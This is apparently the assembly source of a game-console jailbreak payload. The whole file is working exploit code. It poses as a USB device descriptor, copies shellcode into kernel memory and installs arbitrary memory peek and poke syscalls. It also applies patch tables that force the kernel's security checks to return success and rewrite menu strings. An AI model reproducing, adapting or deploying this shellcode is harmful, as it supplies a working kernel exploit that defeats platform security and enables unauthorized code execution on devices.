// Thank you ***** :)

#include "payload_symbols.S"

/* Addressing Macros */
// Payload bases
#define BASE1 (0x700080 - 0x80)
#define BASE2 (0x50BD4 - 0x244)
// Absolute branching
#define ABS(base, target) ((target) - (base) - .)
#define ABS1(target) ABS(BASE1, (target))
#define ABS2(target) ABS(BASE2, (target))
// Dynamic macros to load a label into a register
#define MEM_BASE(dest) \
	li dest, 1; \
	rldicr dest, dest, 63, 0;
#define LOAD_LABEL(base, dest, source, address) \
	oris	dest, source, ((base) + (address))@h; \
	ori		dest, dest, ((base) + (address))@l;
#define LOAD_LABEL1(dest, source, address) LOAD_LABEL(BASE1, dest, source, address)
#define LOAD_LABEL2(dest, source, address) LOAD_LABEL(BASE2, dest, source, address)
#define LOADI_LABEL1(dest, address) LOAD_LABEL(BASE1, dest, dest, address)
#define LOADI_LABEL2(dest, address) LOAD_LABEL(BASE2, dest, dest, address)
// For loading an absolute value
#define LOAD_ABS(dest, source, address) LOAD_LABEL(0, dest, source, address)
#define LOADI_ABS(dest, address) LOAD_ABS(dest, dest, address)
// Absolute .quads
#define QUAD_ABS(base, address) .long 0x80000000; .long base + address
#define QUAD_ABS1(address) QUAD_ABS(BASE1, address)
#define QUAD_ABS2(address) QUAD_ABS(BASE2, address)

/* Patch Table Macros */
#define PATCH_INST(offset, instruction...) .long offset; instruction
#define PATCH_DATA(offset, data...) .long offset; .long data
#define PATCH_BRANCH(offset, op, target) .long offset; op (. + (target - offset))

.org 0
	// USB config descriptor
	.byte	0x09, 0x02, 0x12, 0x00, 0x01, 0x00, 0x00, 0x80
	.byte	0xfa, 0x09, 0x04, 0x00, 0x00, 0x00, 0xfe, 0x01
	.byte	0x02, 0x00, 0x00, 0x00

	.long	0
	.long	0xfaceb003
	.long	0xaabbccdd

	subi	%r3, %r3, 0x1000
	li	%r5, 0x1000
	li	%r4, 1
	rldicr	%r4, %r4, 63, 0
	oris	%r4, %r4, 0x70
shell_code_copy:
	subi	%r5, %r5, 8
	ldx	%r6, %r3, %r5
	stdx	%r6, %r4, %r5
	cmpldi	%r5, 0
	bne	shell_code_copy
	addi	%r4,%r4, 0x80
	mtctr	%r4
	bctr

.org 0x80
shell_code_entry:
	mflr	%r0
	stdu	%r1, -0xa0(%r1)
	std	%r27, 0x78(%r1)
	std	%r28, 0x80(%r1)
	std	%r29, 0x88(%r1)
	std	%r30, 0x90(%r1)
	std	%r31, 0x98(%r1)
	std	%r0, 0xb0(%r1)
	MEM_BASE(%r31)
	LOAD_LABEL2(%r3, %r31, return1)
	LOAD_LABEL1(%r4, %r31, return1)
	li	%r5, 0x4fa
	bl	ABS1(memcpy)
	LOAD_ABS(%r4, %r31, 0x2eb128)
	LOAD_LABEL2(%r3, %r31, syscall6_peek_desc)
	std %r3, (0x08*6)(%r4)
	LOAD_LABEL2(%r3, %r31, syscall7_poke_desc)
	std %r3, (0x08*7)(%r4)
	LOAD_LABEL1(%r5, %r31, patch_table)
shell_code_entry_loop:
	lwz	%r3, 0(%r5)
	cmplwi	%r3, 0
	beq	shell_code_entry_return
	lwz	%r4, 4(%r5)
	add	%r3, %r3, %r31
	stw	%r4, 0(%r3)
	addi	%r5, %r5, 8
	b	shell_code_entry_loop
shell_code_entry_return:
	b	zero_payload
	stdu	%r1, -0xb0(%r1)
	mflr	%r0
	std	%r30, 0xa0(%r1)
	std	%r31, 0xa8(%r1)
	std	%r29, 0x98(%r1)
	std	%r0, 0xc0(%r1)
	li	%r30, 0x7d0
	li	%r31, 0xc8
	b	ABS1(0xab04)

patch_table:
	PATCH_INST(0x0490e0, ld %r4, 0xf08(%r2))
	PATCH_INST(0x0490e4, ld %r3, 0x20(%r28))
	PATCH_INST(0x0490e8, std %r3, 0(%r4))
	PATCH_BRANCH(0x04f0a8, bl, 0x050b44) // memory_patching_desc
	PATCH_INST(0x04ed18, li %r4, 0)
	PATCH_INST(0x04ed1c, stw %r4, 0(%r3))
	PATCH_INST(0x04ed20, blr)
	PATCH_DATA(0x3ba890, 0x01000000)
	PATCH_INST(0x0505d0, li %r3, 1)
	PATCH_INST(0x0505d4, blr)
	.long	0

.org 0x1ac
return1:
	li	%r3, 1
	blr

memory_patching_desc:
	b	memory_patching

syscall6_peek_desc:
	QUAD_ABS2(syscall6_peek)
syscall7_poke_desc:
	QUAD_ABS2(syscall7_poke)

flags:
	.long 0
	.long 0

.org 0x244
syscall6_peek:
	ld %r3, 0x00(%r3)
	blr

syscall7_poke:
	std %r4, 0x00(%r3)
	blr

memory_patching:
	mflr	%r0
	stdu	%r1, -0x1a0(%r1)
	std	%r27, 0x78(%r1)
	std	%r28, 0x80(%r1)
	std	%r29, 0x88(%r1)
	std	%r30, 0x90(%r1)
	std	%r31, 0x98(%r1)
	std	%r0, 0x1b0(%r1)
	mr	%r29, %r3
	mr	%r30, %r4
	MEM_BASE(%r31)
	ld	%r28, -0x6a00(%r2)
	ld	%r28, 0x68(%r28)
	ld	%r28, 0x18(%r28)
	ld	%r27, 0xf08(%r2)
	ld	%r9, 0x18(%r29)
	lwz	%r9, 0x30(%r9)
	rldicl	%r9, %r9, 48, 16
	cmpwi	%r9, 0x29
	bne	loc_4d4
	ld	%r4, 0x10(%r28)
	rldicr	%r5, %r4, 24, 39
	rldicl	%r5, %r5, 8, 56
	cmpwi	%r5, 0xff
	beq	loc_4a8
	ori	%r4, %r4, 3
	std	%r4, 0x10(%r28)
	li	%r3, 6
	stw	%r3, 0(%r30)
	b	loc_4b8
loc_4a8:
	ori	%r4, %r4, 2
	std	%r4, 0x10(%r28)
	li	%r3, 0x2c
	stw	%r3, 0(%r30)
loc_4b8:
	lwz	%r5, 4(%r28)
	ld	%r4, 8(%r28)
	ld	%r3, 0(%r27)
	add	%r9, %r3, %r5
	std	%r9, 0(%r27)
	bl	ABS2(memcpy)
	b	loc_594
loc_4d4:
	mr	%r3, %r29
	mr	%r4, %r30
	bl	ABS2(0x4e81c)
	mr	%r29, %r31
	LOADI_LABEL2(%r29, flags + 4)
	lwz	%r3, 0(%r29)
	lwz	%r5, 4(%r28)
	add	%r3, %r3, %r5
	stw	%r3, 0(%r29)
	ld	%r4, 0x10(%r28)
	rldicr	%r5, %r4, 24, 39
	rldicl	%r5, %r5, 8, 56
	cmpwi	%r5, 0xff
	bne	loc_594
	ld	%r3, 0(%r27)
	li	%r4, 0
	li	%r6, 0
loc_51c:
	add	%r7, %r3, %r4
	lwz	%r5, 0(%r7)
	xor	%r6, %r6, %r5
	addi	%r4, %r4, 4
	cmpldi	%r4, 0x400
	bne	loc_51c
	lwz	%r3, 0(%r29)
	rldicr	%r6, %r6, 32, 31
	or	%r6, %r6, %r3
	li	%r3, 0
	stw	%r3, 0(%r29)
	mr	%r7, %r31
	LOADI_LABEL2(%r7, memory_patch_table)
loc_554:
	ld	%r3, 0(%r7)
	cmpldi	%r3, 0
	beq	loc_594
	addi	%r7, %r7, 0x10
	cmpld	%r3, %r6
	bne	loc_554
	ld	%r5, -8(%r7)
	ld	%r7, 0(%r27)
loc_574:
	lwz	%r3, 0(%r5)
	cmplwi	%r3, 0
	beq	loc_594
	lwz	%r4, 4(%r5)
	add	%r3, %r3, %r7
	stw	%r4, 0(%r3)
	addi	%r5, %r5, 8
	b	loc_574
loc_594:
	li	%r3, 0
	ld	%r27, 0x78(%r1)
	ld	%r28, 0x80(%r1)
	ld	%r29, 0x88(%r1)
	ld	%r30, 0x90(%r1)
	ld	%r31, 0x98(%r1)
	ld	%r0, 0x1b0(%r1)
	addi	%r1, %r1, 0x1a0
	mtlr	%r0
	blr
	stdu	%r1, -0xb0(%r1)
	mflr	%r0
	std	%r30, 0xa0(%r1)
	std	%r31, 0xa8(%r1)
	std	%r29, 0x98(%r1)
	std	%r0, 0xc0(%r1)
	li	%r30, 0xfa0
	li	%r31, 0xc8
	b	ABS2(0xab04)

memory_patch_table:
	.quad	0xa0556f3d002cb8fd
	QUAD_ABS2(memory_patch_table_1)
	.quad	0x8c0a948c000d99b1
	QUAD_ABS2(memory_patch_table_3)
	.quad	0xa2bc1a5600052adc
	QUAD_ABS2(memory_patch_table_4)
	.quad	0x6b70280200020017
	QUAD_ABS2(memory_patch_table_2)
	.quad	0
memory_patch_table_1:
	PATCH_INST(0x305354, li %r3, 130)
	PATCH_INST(0x5f3fc0, li %r3, 1)
	PATCH_INST(0x5f3fc4, blr)
	.long 0
memory_patch_table_2:
	PATCH_INST(0x2ed0c, li %r29, 1)
	.long 0
memory_patch_table_3:
	PATCH_DATA(0x0022b888, 0x5f746f6f)
	PATCH_DATA(0x0022b88c, 0x6c322e78)
	PATCH_DATA(0x0022b890, 0x6d6c2372)
	PATCH_DATA(0x0022b894, 0x6f6f7400)
	.long 0
memory_patch_table_4:
	PATCH_DATA(0x000d68b8, 0x5f746f6f)
	PATCH_DATA(0x000d68bc, 0x6c322e78)
	PATCH_DATA(0x000d68c0, 0x6d6c2372)
	PATCH_DATA(0x000d68c4, 0x6f6f7400)
	.long 0

.org 0x6b0
zero_payload:
	ld	%r27, 0x78(%r1)
	ld	%r28, 0x80(%r1)
	ld	%r29, 0x88(%r1)
	ld	%r30, 0x90(%r1)
	ld	%r31, 0x98(%r1)
	ld	%r0, 0xb0(%r1)
	addi	%r1, %r1, 0xa0
	mtlr	%r0
	MEM_BASE(%r3)
	oris	%r3, %r3, 0x70
	li	%r4, 0
	li	%r5, 0x6e8
	b	ABS1(memset)
	nop
	nop

	// fill out to 3840 bytes
.org 3840
